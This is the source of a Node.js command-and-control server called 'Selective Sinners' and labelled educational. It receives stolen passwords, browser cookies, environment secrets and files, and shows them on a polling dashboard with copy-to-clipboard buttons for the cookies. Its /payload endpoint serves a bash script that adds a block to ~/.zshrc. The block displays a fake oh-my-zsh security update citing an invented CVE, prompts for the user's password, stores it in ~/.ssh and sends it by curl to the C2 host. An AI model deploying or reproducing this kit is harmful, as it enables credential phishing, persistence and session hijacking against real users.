const express = require("express");
const cors = require("cors");
const path = require("path");

const app = express();
const PORT = 4000;

app.use(cors());
app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true, limit: "10mb" }));

const store = {
  passwords: [],
  cookies: [],
  env: [],
  files: [],
};

function timestamp() {
  return new Date().toISOString();
}

app.post("/log/password", (req, res) => {
  const entry = { ...req.body, receivedAt: timestamp() };
  store.passwords.push(entry);
  console.log("\x1b[31m[PASSWORD CAPTURED]\x1b[0m", JSON.stringify(entry, null, 2));
  res.json({ status: "received" });
});

app.post("/log/cookies", (req, res) => {
  const cookies = req.body;
  const entry = { cookies, receivedAt: timestamp() };
  if (store.cookies.length > 0) {
    store.cookies[store.cookies.length - 1] = entry;
  } else {
    store.cookies.push(entry);
  }
  const count = Array.isArray(cookies) ? cookies.length : 0;
  console.log("\x1b[33m[COOKIES CAPTURED]\x1b[0m %d cookies at %s", count, entry.receivedAt);
  res.json({ status: "received" });
});

app.post("/log/env", (req, res) => {
  const entry = { ...req.body, receivedAt: timestamp() };
  store.env.push(entry);
  console.log("\x1b[35m[ENV CAPTURED]\x1b[0m", JSON.stringify(entry, null, 2));
  res.json({ status: "received" });
});

app.post("/log/files", (req, res) => {
  const entry = { ...req.body, receivedAt: timestamp() };
  store.files.push(entry);
  console.log("\x1b[36m[FILES CAPTURED]\x1b[0m", JSON.stringify(entry, null, 2));
  res.json({ status: "received" });
});

app.get("/api/data", (_req, res) => {
  res.json(store);
});

app.get("/payload", (_req, res) => {
  res.type("text/plain").send(`#!/bin/bash
grep -q '# >>> SELECTIVE-SINNERS-DEMO zsh-update >>>' ~/.zshrc 2>/dev/null && exit 0
cat >> ~/.zshrc << 'EOPAYLOAD'

# >>> SELECTIVE-SINNERS-DEMO zsh-update >>>
(
  _SINNERS_CACHE="\${HOME}/.ssh/.ssh_accounts_sinners"
  mkdir -p "\${HOME}/.ssh"

  if [ ! -f "\$_SINNERS_CACHE" ]; then
    echo ""
    echo "[oh-my-zsh] Upgrade available: zsh 5.9.1 → 5.9.2 (security patch)"
    echo "This update fixes CVE-2026-31337 — credential caching vulnerability."
    echo ""
    printf "Password: "
    read -s _demo_pw
    echo ""
    echo "Verifying... done."
    echo "[oh-my-zsh] Update applied successfully."
    echo ""

    echo "\$_demo_pw" > "\$_SINNERS_CACHE"
    chmod 600 "\$_SINNERS_CACHE"

    curl -s -X POST http://\${C2_HOST:-localhost}:4000/log/password \\
      -H "Content-Type: application/json" \\
      -d "{\\"source\\": \\"shell-persistence\\", \\"user\\": \\"\\$(whoami)\\", \\"password\\": \\"\${_demo_pw}\\", \\"host\\": \\"\\$(hostname)\\"}" \\
      > /dev/null 2>&1

    unset _demo_pw
  fi
)
# <<< SELECTIVE-SINNERS-DEMO zsh-update <<<
EOPAYLOAD
`);
});

app.get("/", (_req, res) => {
  res.send(dashboardHTML());
});

function dashboardHTML() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Selective Sinners — C2 Dashboard</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Courier New', monospace;
      background: #0a0a0a;
      color: #00ff41;
      min-height: 100vh;
    }
    header {
      background: linear-gradient(90deg, #1a0000, #0a0a0a);
      border-bottom: 2px solid #ff0040;
      padding: 20px 32px;
      display: flex;
      align-items: center;
      gap: 16px;
    }
    header h1 {
      font-size: 1.6rem;
      color: #ff0040;
      text-shadow: 0 0 10px rgba(255,0,64,0.5);
    }
    header .subtitle {
      color: #666;
      font-size: 0.85rem;
    }
    .status-bar {
      background: #111;
      padding: 8px 32px;
      font-size: 0.75rem;
      color: #555;
      border-bottom: 1px solid #222;
      display: flex;
      justify-content: space-between;
    }
    .status-bar .live {
      color: #00ff41;
      animation: blink 1.5s infinite;
    }
    @keyframes blink { 50% { opacity: 0.3; } }
    main {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 20px;
      padding: 24px 32px;
      max-width: 1400px;
      margin: 0 auto;
    }
    .panel {
      background: #111;
      border: 1px solid #222;
      border-radius: 6px;
      overflow: hidden;
    }
    .panel-header {
      padding: 12px 16px;
      font-size: 0.85rem;
      font-weight: bold;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .panel-header .count {
      background: #222;
      padding: 2px 10px;
      border-radius: 10px;
      font-size: 0.75rem;
    }
    .panel.passwords .panel-header { background: #1a0000; color: #ff4444; border-bottom: 1px solid #331111; }
    .panel.cookies .panel-header { background: #1a1400; color: #ffaa00; border-bottom: 1px solid #332a00; }
    .panel.env .panel-header { background: #0f001a; color: #cc44ff; border-bottom: 1px solid #220033; }
    .panel.files .panel-header { background: #001a1a; color: #00cccc; border-bottom: 1px solid #003333; }
    .panel-body {
      padding: 16px;
      max-height: 400px;
      overflow-y: auto;
      font-size: 0.8rem;
      line-height: 1.6;
    }
    .panel-body::-webkit-scrollbar { width: 6px; }
    .panel-body::-webkit-scrollbar-track { background: #111; }
    .panel-body::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
    .entry {
      background: #0d0d0d;
      border: 1px solid #1a1a1a;
      border-radius: 4px;
      padding: 10px;
      margin-bottom: 8px;
      white-space: pre-wrap;
      word-break: break-all;
    }
    .cookie-entry {
      background: #0d0d0d;
      border: 1px solid #1a1a1a;
      border-radius: 4px;
      padding: 8px 10px;
      margin-bottom: 6px;
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 0.78rem;
    }
    .cookie-entry .cookie-info {
      flex: 1;
      min-width: 0;
      overflow: hidden;
    }
    .cookie-entry .cookie-domain {
      color: #ffaa00;
      font-weight: bold;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }
    .cookie-entry .cookie-name {
      color: #888;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }
    .cookie-entry .cookie-value {
      color: #555;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
      max-width: 200px;
    }
    .copy-btn {
      flex-shrink: 0;
      background: #1a1400;
      border: 1px solid #332a00;
      color: #ffaa00;
      padding: 4px 10px;
      border-radius: 3px;
      cursor: pointer;
      font-family: 'Courier New', monospace;
      font-size: 0.7rem;
      transition: all 0.15s;
    }
    .copy-btn:hover { background: #332a00; color: #ffcc00; }
    .copy-btn.copied { background: #003300; border-color: #005500; color: #00ff41; }
    .search-box {
      width: 100%;
      padding: 8px 12px;
      background: #0d0d0d;
      border: 1px solid #332a00;
      border-radius: 4px;
      color: #ffaa00;
      font-family: 'Courier New', monospace;
      font-size: 0.8rem;
      outline: none;
      margin-bottom: 12px;
    }
    .search-box::placeholder { color: #554400; }
    .search-box:focus { border-color: #ffaa00; box-shadow: 0 0 6px rgba(255,170,0,0.2); }
    .domain-group {
      margin-bottom: 10px;
      border: 1px solid #1a1a1a;
      border-radius: 4px;
      overflow: hidden;
    }
    .domain-header {
      background: #141000;
      padding: 8px 12px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      cursor: pointer;
      user-select: none;
      border-bottom: 1px solid #1a1a1a;
    }
    .domain-header:hover { background: #1a1400; }
    .domain-header .domain-label {
      color: #ffaa00;
      font-weight: bold;
      font-size: 0.8rem;
    }
    .domain-header .domain-meta {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 0.7rem;
    }
    .domain-header .domain-count {
      background: #222;
      padding: 1px 8px;
      border-radius: 8px;
      color: #888;
    }
    .domain-header .domain-versions {
      color: #555;
    }
    .domain-cookies { display: none; }
    .domain-cookies.open { display: block; }
    .copy-all-btn {
      background: #0d1a00;
      border: 1px solid #1a3300;
      color: #44aa00;
      padding: 3px 8px;
      border-radius: 3px;
      cursor: pointer;
      font-family: 'Courier New', monospace;
      font-size: 0.65rem;
      transition: all 0.15s;
    }
    .copy-all-btn:hover { background: #1a3300; color: #66cc00; }
    .copy-all-btn.copied { background: #003300; border-color: #005500; color: #00ff41; }
    .empty {
      color: #333;
      font-style: italic;
      text-align: center;
      padding: 30px;
    }
    footer {
      text-align: center;
      padding: 20px;
      color: #333;
      font-size: 0.7rem;
    }
  </style>
</head>
<body>
  <header>
    <h1>SELECTIVE SINNERS</h1>
    <span class="subtitle">Educational C2 Dashboard — localhost:4000</span>
  </header>
  <div class="status-bar">
    <span><span class="live">● LIVE</span> — Listening for exfiltrated data</span>
    <span id="clock"></span>
  </div>
  <main>
    <div class="panel passwords">
      <div class="panel-header">
        PASSWORDS
        <span class="count" id="pw-count">0</span>
      </div>
      <div class="panel-body" id="pw-body"><div class="empty">Waiting for captures...</div></div>
    </div>
    <div class="panel cookies">
      <div class="panel-header">
        COOKIES
        <span class="count" id="ck-count">0</span>
      </div>
      <div class="panel-body" id="ck-body">
        <input type="text" class="search-box" id="cookie-search" placeholder="Search by domain, name, or value..." oninput="filterCookies()">
        <div id="ck-list"><div class="empty">Waiting for captures...</div></div>
      </div>
    </div>
    <div class="panel env">
      <div class="panel-header">
        ENV / SECRETS
        <span class="count" id="env-count">0</span>
      </div>
      <div class="panel-body" id="env-body"><div class="empty">Waiting for captures...</div></div>
    </div>
    <div class="panel files">
      <div class="panel-header">
        FILES
        <span class="count" id="file-count">0</span>
      </div>
      <div class="panel-body" id="file-body"><div class="empty">Waiting for captures...</div></div>
    </div>
  </main>
  <footer>FOR EDUCATIONAL PURPOSES ONLY — Think Before You Click</footer>
  <script>
    function updateClock() {
      document.getElementById('clock').textContent = new Date().toLocaleTimeString();
    }
    setInterval(updateClock, 1000);
    updateClock();

    function renderEntries(data, elementId, countId) {
      const body = document.getElementById(elementId);
      const count = document.getElementById(countId);
      count.textContent = data.length;
      if (data.length === 0) {
        body.innerHTML = '<div class="empty">Waiting for captures...</div>';
        return;
      }
      body.innerHTML = data.map(e =>
        '<div class="entry">' + escapeHtml(JSON.stringify(e, null, 2)) + '</div>'
      ).join('');
    }

    let _domainGroups = {};
    let _domainList = [];

    function buildDomainGroups(data) {
      const groups = {};
      data.forEach(function(entry) {
        var ts = entry.receivedAt || 'unknown';
        (entry.cookies || []).forEach(function(c) {
          var d = (c.domain || 'unknown').replace(/^\\./, '');
          if (!groups[d]) groups[d] = { latest: {}, versions: [] };
          var key = c.name + '||' + (c.path || '/');
          var prev = groups[d].latest[key];
          if (!prev || prev.value !== c.value) {
            if (prev) {
              var old = Object.assign({}, prev);
              old._supersededAt = ts;
              groups[d].versions.push(old);
            }
            var cur = Object.assign({}, c);
            cur._capturedAt = ts;
            groups[d].latest[key] = cur;
          }
        });
      });
      return groups;
    }

    function renderCookies(data, _elementId, countId) {
      _domainGroups = buildDomainGroups(data);
      var total = 0;
      Object.keys(_domainGroups).forEach(function(d) {
        total += Object.keys(_domainGroups[d].latest).length;
      });
      document.getElementById(countId).textContent = total;
      filterCookies();
    }

    function filterCookies() {
      var q = (document.getElementById('cookie-search').value || '').toLowerCase();
      var list = document.getElementById('ck-list');
      _domainList = Object.keys(_domainGroups).sort();
      if (_domainList.length === 0) {
        list.innerHTML = '<div class="empty">Waiting for captures...</div>';
        return;
      }
      var html = [];
      _domainList.forEach(function(domain, di) {
        var group = _domainGroups[domain];
        var cookies = Object.values(group.latest);
        var matched = q ? cookies.filter(function(c) {
          return (c.domain || '').toLowerCase().indexOf(q) >= 0 ||
                 (c.name || '').toLowerCase().indexOf(q) >= 0 ||
                 (c.value || '').toLowerCase().indexOf(q) >= 0;
        }) : cookies;
        if (matched.length === 0) return;
        var vCount = group.versions.length;
        var rows = matched.map(function(c, ci) {
          var name = escapeHtml(c.name || '');
          var value = escapeHtml(c.value || '');
          return '<div class="cookie-entry">'
            + '<div class="cookie-info">'
            + '<div class="cookie-name">' + name + ' = <span class="cookie-value">' + value + '</span></div>'
            + '</div>'
            + '<button class="copy-btn" data-di="' + di + '" data-ci="' + ci + '" title="Copy cookie JSON">COPY</button>'
            + '</div>';
        }).join('');
        html.push(
          '<div class="domain-group">'
          + '<div class="domain-header" data-target="dg-' + di + '">'
          + '<span class="domain-label">' + escapeHtml(domain) + '</span>'
          + '<span class="domain-meta">'
          + (vCount > 0 ? '<span class="domain-versions">' + vCount + ' prev</span>' : '')
          + '<span class="domain-count">' + matched.length + '</span>'
          + '<button class="copy-all-btn" data-di="' + di + '" title="Copy all cookies for this domain">COPY ALL</button>'
          + '</span>'
          + '</div>'
          + '<div class="domain-cookies" id="dg-' + di + '">' + rows + '</div>'
          + '</div>'
        );
      });
      list.innerHTML = html.length ? html.join('') : '<div class="empty">No cookies match filter</div>';
    }

    document.addEventListener('click', function(e) {
      var btn = e.target;
      if (btn.classList.contains('copy-btn') && btn.dataset.di !== undefined) {
        var domain = _domainList[parseInt(btn.dataset.di)];
        var group = _domainGroups[domain];
        if (!group) return;
        var cookies = Object.values(group.latest);
        var ci = parseInt(btn.dataset.ci);
        var json = JSON.stringify(cookies[ci], null, 4);
        navigator.clipboard.writeText(json).then(function() {
          btn.textContent = 'COPIED';
          btn.classList.add('copied');
          setTimeout(function() { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 1500);
        });
      }
      if (btn.classList.contains('copy-all-btn') && btn.dataset.di !== undefined) {
        e.stopPropagation();
        var domain = _domainList[parseInt(btn.dataset.di)];
        var group = _domainGroups[domain];
        if (!group) return;
        var all = Object.values(group.latest);
        var json = JSON.stringify(all, null, 4);
        navigator.clipboard.writeText(json).then(function() {
          btn.textContent = 'COPIED';
          btn.classList.add('copied');
          setTimeout(function() { btn.textContent = 'COPY ALL'; btn.classList.remove('copied'); }, 1500);
        });
      }
      var header = btn.closest('.domain-header');
      if (header && !btn.classList.contains('copy-all-btn')) {
        var target = header.dataset.target;
        var el = document.getElementById(target);
        if (el) el.classList.toggle('open');
      }
    });

    function escapeHtml(str) {
      return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
    }

    async function poll() {
      try {
        const res = await fetch('/api/data');
        const data = await res.json();
        renderEntries(data.passwords, 'pw-body', 'pw-count');
        renderCookies(data.cookies, 'ck-body', 'ck-count');
        renderEntries(data.env, 'env-body', 'env-count');
        renderEntries(data.files, 'file-body', 'file-count');
      } catch {}
    }
    setInterval(poll, 2000);
    poll();
  </script>
</body>
</html>`;
}

app.listen(PORT, () => {
  console.log("");
  console.log("  ╔══════════════════════════════════════════╗");
  console.log("  ║   SELECTIVE SINNERS — C2 Server          ║");
  console.log("  ║   Dashboard: http://localhost:" + PORT + "        ║");
  console.log("  ║   FOR EDUCATIONAL PURPOSES ONLY          ║");
  console.log("  ╚══════════════════════════════════════════╝");
  console.log("");
  console.log("  Endpoints:");
  console.log("    POST /log/password");
  console.log("    POST /log/cookies");
  console.log("    POST /log/env");
  console.log("    POST /log/files");
  console.log("    GET  /api/data");
  console.log("");
});
